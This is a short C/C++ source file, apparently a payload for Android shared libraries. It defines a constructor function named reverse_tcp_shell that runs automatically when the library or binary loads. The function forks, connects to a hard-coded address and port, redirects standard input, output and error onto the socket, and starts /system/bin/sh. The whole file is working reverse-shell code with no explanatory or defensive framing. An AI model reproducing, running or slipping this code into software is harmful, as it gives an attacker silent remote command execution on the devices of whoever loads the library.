#include <cstdio>
#include <unistd.h>
#include <sys/types.h>
#include <arpa/inet.h>

#include<netinet/in.h>

#include <sys/socket.h>

#define ADDR "127.0.0.1"
#define PORT 80

void __attribute__ ((constructor)) reverse_tcp_shell() {

    struct sockaddr_in sock_address{};
    int sock;

    if (fork() == 0) {
        sock_address.sin_family = AF_INET;
        sock_address.sin_addr.s_addr = inet_addr(ADDR);
        sock_address.sin_port = htons(PORT);

        sock = socket(AF_INET, SOCK_STREAM, 0);
        connect(sock, (struct sockaddr *)&sock_address, sizeof(sock_address));
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        execve("/system/bin/sh", 0, 0);
    }
}